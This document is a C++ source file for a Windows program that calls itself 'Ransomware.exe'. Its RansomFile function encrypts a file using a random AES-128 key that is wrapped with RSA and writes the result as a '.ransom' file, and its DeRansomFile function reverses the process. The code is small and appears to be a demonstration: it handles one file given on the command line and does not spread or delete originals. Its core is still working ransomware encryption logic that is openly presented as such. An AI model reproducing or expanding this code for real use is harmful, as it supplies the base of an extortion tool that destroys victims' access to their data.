#include "includes.hpp"

BOOL DeRansomFile( const char* szFileName )
{
	BOOL bResult = FALSE;

	PBYTE pbCiphertextFileData = nullptr;
	DWORD dwCiphertextFileDataLen = 0;

	PBYTE pbDecryptedFileData = nullptr;
	DWORD dwDecryptedFileDataLen = 0;

	PBYTE pbDecryptedAESKey = nullptr;
	DWORD pbDecryptedAESKeyLen = 0;

	BYTE pbCiphertextKeyData[ 0x100 ]{ };
	DWORD dwCiphertextKeyData = sizeof( pbCiphertextKeyData );

	BYTE pbKey[ 16 ]{ };
	DWORD dwKeyLen = sizeof( pbKey );

	BYTE pbIV[ 16 ]{ };
	DWORD dwIVLen = sizeof( pbIV );

	HANDLE hFile = nullptr;

	//
	// Read file from disk
	//
	bResult = ReadFileToByteArray( szFileName, &pbCiphertextFileData, &dwCiphertextFileDataLen );
	if( !bResult )
	{
		printf( __FUNCTION__ " -- ReadFileToByteArray failed!\n" );
		goto Exit;
	}

	{
		//
		// The RSA ciphertext containing our AES key is file begging + IV length
		//
		memcpy( pbCiphertextKeyData, pbCiphertextFileData + dwIVLen, dwCiphertextKeyData );

		bResult = RSADecrypt( pbCiphertextKeyData, dwCiphertextKeyData, &pbDecryptedAESKey, &pbDecryptedAESKeyLen );
		if( !bResult )
		{
			printf( __FUNCTION__ " -- RSADecrypt failed!\n" );
			goto Exit;
		}

		//
		// The decrypted length should match the AES-128 blocksize 16 bytes
		//
		if( pbDecryptedAESKeyLen != dwKeyLen )
		{
			printf( __FUNCTION__ " -- Invalid AES key!\n" );
			goto Exit;
		}

		//
		// The IV is the file first 16 bytes, we extract that
		//
		memcpy( pbIV, pbCiphertextFileData, dwIVLen );

		//
		// We have the decrypted AES key, lets copy to the pbKey buffer.
		//
		memcpy( pbKey, pbDecryptedAESKey, dwKeyLen );

		//
		// dwTotalCount is the sum of IV Len + RSA cipher key length, leading to the block with the actual file data encrypted.
		//
		const DWORD dwTotalCount = dwIVLen + dwCiphertextKeyData;

		bResult = AESDecrypt(
			pbCiphertextFileData + dwTotalCount,
			dwCiphertextFileDataLen - dwTotalCount,
			pbKey,
			dwKeyLen,
			pbIV,
			dwIVLen,
			&pbDecryptedFileData,
			&dwDecryptedFileDataLen
		);
		if( !bResult )
		{
			printf( __FUNCTION__ " -- AESDecrypt failed!\n" );
			goto Exit;
		}

		//
		// Create a .clean file with the decrypted data
		//
		char szNewPath[ MAX_PATH ]{ };
		strcpy_s( szNewPath, szFileName );
		::PathRemoveExtensionA( szNewPath );
		strcat_s( szNewPath, ".clean" );

		hFile = ::CreateFileA(
			szNewPath,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			nullptr
		);
		if( !hFile || hFile == INVALID_HANDLE_VALUE )
		{
			bResult = FALSE;
			printf( __FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError( ) );
			goto Exit;
		}

		DWORD dwWritten = 0;
		::WriteFile( hFile, pbDecryptedFileData, dwDecryptedFileDataLen, &dwWritten, nullptr );
	}

Exit:
	if( hFile )
		::CloseHandle( hFile );

	if( pbDecryptedAESKey )
		::HeapFree( ::GetProcessHeap( ), 0, pbDecryptedAESKey );

	if( pbCiphertextFileData )
		::VirtualFree( pbCiphertextFileData, 0, MEM_RELEASE );

	if( pbDecryptedFileData )
		::VirtualFree( pbDecryptedFileData, 0, MEM_RELEASE );

	return bResult;
}

BOOL RansomFile( const char* szFileName )
{
	BOOL bResult = FALSE;

	PBYTE pbEncryptedAESKey = nullptr;
	DWORD dwEncryptedAESKeyLen = 0;

	PBYTE pbPlaintextFileData = nullptr;
	DWORD dwPlaintextFileDataLen = 0;

	PBYTE pbEncryptedFileData = nullptr;
	DWORD dwEncryptedFileDataLen = 0;

	BYTE pbKey[ 16 ]{ };
	DWORD dwKeyLen = sizeof( pbKey );

	BYTE pbIV[ 16 ]{ };
	DWORD dwIVLen = sizeof( pbIV );

	HANDLE hFile = nullptr;

	//
	// Read file from disk
	//
	bResult = ReadFileToByteArray( szFileName, &pbPlaintextFileData, &dwPlaintextFileDataLen );
	if( !bResult )
	{
		printf( __FUNCTION__ " -- ReadFileToByteArray failed!\n" );
		goto Exit;
	}

	//
	// Generate crypto random IV and AES key
	//
	::BCryptGenRandom( NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
	::BCryptGenRandom( NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG );

	{
		//
		// Encrypt the AES key first.
		//
		bResult = RSAEncrypt(
			pbKey,
			dwKeyLen,
			&pbEncryptedAESKey,
			&dwEncryptedAESKeyLen
		);
		if( !bResult )
		{
			printf( __FUNCTION__ " -- RSAEncrypt failed!\n" );
			goto Exit;
		}

		//
		// Encrypt the actual file
		//
		bResult = AESEncrypt(
			pbPlaintextFileData,
			dwPlaintextFileDataLen,
			pbKey,
			dwKeyLen,
			pbIV,
			dwIVLen,
			&pbEncryptedFileData,
			&dwEncryptedFileDataLen
		);
		if( !bResult )
		{
			printf( __FUNCTION__ " -- AESEncrypt failed!\n" );
			goto Exit;
		}

		//
		// Create the .ransom file
		//
		char szNewPath[ MAX_PATH ]{ };
		strcpy_s( szNewPath, szFileName );
		::PathRemoveExtensionA( szNewPath );
		strcat_s( szNewPath, ".ransom" );

		hFile = ::CreateFileA(
			szNewPath,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			nullptr
		);
		if( !hFile || hFile == INVALID_HANDLE_VALUE )
		{
			bResult = FALSE;
			printf( __FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError( ) );
			goto Exit;
		}

		//
		// Encrypted file format order:
		// IV -> AES RSA Encrypted Key -> AES Encrypted File Data
		//
		DWORD dwWritten = 0;
		::WriteFile( hFile, pbIV, dwIVLen, &dwWritten, nullptr );
		::WriteFile( hFile, pbEncryptedAESKey, dwEncryptedAESKeyLen, &dwWritten, nullptr );
		::WriteFile( hFile, pbEncryptedFileData, dwEncryptedFileDataLen, &dwWritten, nullptr );
	}

Exit:
	if( hFile )
		::CloseHandle( hFile );

	if( pbEncryptedAESKey )
		::HeapFree( ::GetProcessHeap( ), 0, pbEncryptedAESKey );

	if( pbPlaintextFileData )
		::VirtualFree( pbPlaintextFileData, 0, MEM_RELEASE );

	if( pbEncryptedFileData )
		::VirtualFree( pbEncryptedFileData, 0, MEM_RELEASE );

	return bResult;
}

int main( int argc, char** argv )
{
	if( ( argc > 1 ) &&
		( ( *argv[ 1 ] == '-' ) || ( *argv[ 1 ] == '/' ) ) )
	{
		if( _stricmp( "e", argv[ 1 ] + 1 ) == 0 )
		{
			printf( "RansomFile returned %d\n", RansomFile( argv[ 2 ] ) );
		}
		else if( _stricmp( "d", argv[ 1 ] + 1 ) == 0 )
		{
			printf( "DeRansomFile returned %d\n", DeRansomFile( argv[ 2 ] ) );
		}
		else
		{
			goto Dispatch;
		}
		exit( 0 );
	}

Dispatch:
	printf( "Ransomware.exe -e [filepath]\tEncrypts a file.\n" );
	printf( "Ransomware.exe -d [filepath]\tDecrypts a file.\n" );

	return 0;
}